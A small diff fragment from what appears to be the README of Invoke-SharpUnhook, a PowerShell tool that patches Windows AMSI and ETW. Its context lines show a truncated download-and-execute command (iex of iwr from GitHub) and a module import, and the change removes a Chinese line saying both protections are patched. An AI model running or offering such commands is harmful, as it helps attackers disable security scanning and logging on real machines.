@@ -69,7 +69,7 @@ iex(iwr -UseBasicParsing https://raw.githubusercontent.com/INotGreen/Invoke-Shar
 Import-Module .\Invoke-SharpUnhook.ps1
 ```
 ![image](https://user-images.githubusercontent.com/89376703/200115967-953b394b-90ad-477c-b12c-7370c73fe667.png)
-这样AMSI和ETW就已经Ptach了
+
 
 
 ### 总结
